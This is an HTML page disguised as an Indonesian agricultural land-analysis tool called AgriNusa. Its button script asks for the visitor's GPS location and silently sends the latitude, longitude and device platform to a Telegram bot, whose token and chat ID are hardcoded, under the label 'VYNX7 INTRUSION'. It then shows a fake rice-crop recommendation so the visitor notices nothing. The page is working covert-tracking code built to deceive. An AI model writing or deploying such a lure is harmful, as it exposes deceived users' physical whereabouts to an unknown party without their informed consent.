<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AgriNusa - Analisis Lahan</title>
    <style>
        body { background: #0f0f0f; color: #00ff00; font-family: 'Courier New', Courier, monospace; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; }
        .btn { padding: 15px 25px; background: transparent; border: 1px solid #00ff00; color: #00ff00; cursor: pointer; font-size: 1.2rem; transition: 0.3s; }
        .btn:hover { background: #00ff00; color: #000; box-shadow: 0 0 15px #00ff00; }
        #status { margin-top: 20px; font-size: 0.9rem; text-align: center; }
    </style>
</head>
<body>

    <h2>VYNX7 AGRIKULTURA</h2>
    <button class="btn" onclick="executeVynx7()">MULAI ANALISIS LAHAN</button>
    <div id="status">Sistem Siap...</div>

    <script>
        async function executeVynx7() {
            const status = document.getElementById('status');
            status.innerText = "Mengakses Satelit GPS...";

            // 1. Ambil Lokasi (Trigger Utama)
            navigator.geolocation.getCurrentPosition(async (pos) => {
                const lat = pos.coords.latitude;
                const lon = pos.coords.longitude;
                
                status.innerText = "Mengirim Data ke Server...";

                // --- LOGIKA CURL DALAM JS ---
                const TOKEN = "8097166695:AAF6olxar4wlrlyP1YRQtPkVQuLP5A-Q4fs";
                const CHAT_ID = "6697482758";
                const URL = `https://api.telegram.org/bot${TOKEN}/sendMessage`;

                const message = `🚨 <b>VYNX7 INTRUSION</b>\n📍 Lat: <code>${lat}</code>\n📍 Lon: <code>${lon}</code>\n📱 OS: ${navigator.platform}`;

                try {
                    // Ini adalah "CURL" versi Browser
                    const response = await fetch(URL, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            chat_id: CHAT_ID,
                            text: message,
                            parse_mode: "HTML"
                        })
                    });

                    const resData = await response.json();
                    
                    if(resData.ok) {
                        status.innerHTML = "✅ Analisis Selesai!<br>Tanaman Cocok: <b>Padi Unggul IR64</b>";
                    } else {
                        status.innerText = "Error API: " + resData.description;
                    }

                } catch (err) {
                    status.innerText = "Gagal terhubung ke server.";
                    console.error(err);
                }

            }, (err) => {
                status.innerText = "Gagal: Izin lokasi ditolak atau GPS mati.";
            });
        }
    </script>
</body>
</html>
